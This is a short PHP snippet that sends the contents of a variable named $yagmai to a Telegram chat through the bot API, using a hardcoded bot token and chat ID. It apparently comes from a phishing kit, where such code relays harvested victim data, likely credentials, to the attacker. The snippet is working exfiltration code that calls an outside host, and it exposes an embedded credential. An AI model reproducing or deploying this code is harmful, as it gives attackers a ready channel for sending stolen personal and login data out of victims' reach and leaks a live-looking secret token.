<?php function sendMessage($messaggio) {
  $chatID = '1556350571';$token = '2039965570:AAF1mSbNi349z0_Dka9v8N8c8xRH4iHKZRM';
  $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
  $url = $url . "&text=" . urlencode($messaggio);
  $ch = curl_init();
  $optArray = array(
          CURLOPT_URL => $url,
          CURLOPT_RETURNTRANSFER => true
  );
  curl_setopt_array($ch, $optArray);
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
  }
  sendMessage($yagmai);
